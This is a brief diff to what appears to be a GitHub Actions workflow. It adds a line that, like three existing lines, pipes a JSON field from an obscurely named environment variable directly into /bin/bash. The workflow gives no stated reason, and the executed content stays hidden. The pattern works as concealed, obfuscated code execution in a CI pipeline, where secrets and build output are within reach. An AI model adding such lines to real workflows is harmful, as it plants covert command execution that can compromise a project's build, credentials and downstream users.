@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$nkx6" | jq -r .pw397 | /bin/bash
           echo $bdge9 | jq -r .do28 | /bin/bash
           printf '%s' "$ed0" | jq -r .l17 | /bin/bash
+          printf '%s' "$ow97" | jq -r .wfqe46 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
